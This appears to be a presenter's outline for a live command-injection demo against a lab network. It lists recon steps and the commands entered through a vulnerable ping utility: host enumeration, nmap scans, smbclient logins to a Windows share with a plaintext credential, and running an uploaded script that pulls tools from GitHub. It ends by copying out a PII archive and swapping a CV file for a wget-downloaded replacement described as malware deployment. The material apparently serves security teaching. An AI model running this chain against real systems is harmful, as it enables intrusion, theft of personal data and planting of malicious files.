Command Injection Demo:
=======================

Academic:
=========
    Dig through DNS
    Port scan IPs
    Interrogate IP
	HTTP Watch/Fiddler/Postman/Wireshark
	Headers can indicate the stack


Commands:
==========
    Login: wier credentials to connect.hackysock.com
    Browse site… Exploratory work
    Over to the ping utility
        note the command injection flaw.
	    whoami
	    pwd
	    cd ../../
	    ls
	    ifconfig -a | grep netmask
	    which nmap
	    nmap -sP 192.168.122.1/24
	    namp -p 135 192.168.122.7
	    smbclient -N '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3 -c ls
        smbclient -N '//192.168.122.7/Private_Files' -W HACKYSOC -U wier%frantic-Folly3 -c ls
	
Find Upload section:
====================
    Upload file: Note the path description
	Figure out where uploads go
	Upload script
	CHMOD script
		chmod 775 ../../hackable/uploads/pull_scripts.sh
	Execute script
		../../hackable/uploads/pull_scripts.sh
	Show all the scripts that were pulled down from GitHub

Drop to Shell:
=================
Show rest of demo and malware deployment. \
	Execute pii script \
	Show pii data pulled from windows machine \
    Show Roger DOC \
        smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3 \
    pull roger doc at CLI \
        smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; get PII.zip' -W HACYSOC -U wier%frantic-Folly3 \
    Push new DOC to FileShare \
        smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3 \
        Browse to Roger DOC in Private_Files \
        del rogeradamsCV.doc \
        exit \
        cd /var/tmp \
        wget https://github.com/rnewt6926/Ingram/blob/main/rogeradamsCV.doc \
        smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; put rogeradamsCV.doc' -W HACKYSOC -U wier%frantic-Folly3 \


Wrap up:
========
    Now we wait \
